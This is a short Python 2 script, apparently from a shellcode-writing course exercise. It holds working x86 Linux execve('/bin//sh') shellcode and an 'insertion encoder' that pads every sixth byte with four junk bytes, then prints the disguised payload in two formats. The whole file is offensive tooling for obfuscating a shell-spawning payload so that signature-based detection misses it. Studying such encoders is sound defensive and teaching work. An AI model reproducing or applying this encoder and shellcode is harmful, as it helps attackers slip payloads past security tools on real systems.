#!/usr/bin/python

# Python Insertion Encoder 
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


encoded = ""
encoded2 = ""
i=1
print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	encoded += '\\x'
	encoded += '%02x' % x
	if i%6 == 0:
		encoded += '\\x%02x' % 0x70
		encoded += '\\x%02x' % 0x75
		encoded += '\\x%02x' % 0x74
		encoded += '\\x%02x' % 0x61
	# encoded += '\\x%02x' % random.randint(1,255)

	encoded2 += '0x'
	encoded2 += '%02x,' %x

	if i%6 == 0:
		encoded2 += '0x%02x,' % 0x70
		encoded2 += '0x%02x,' % 0x75
		encoded2 += '0x%02x,' % 0x74
		encoded2 += '0x%02x,' % 0x61
	i+=1


	# encoded2 += '0x%02x,' % random.randint(1,255)



print encoded
print '\n\n'
print encoded2

print 'shellcode Len: %d' % len(bytearray(shellcode))
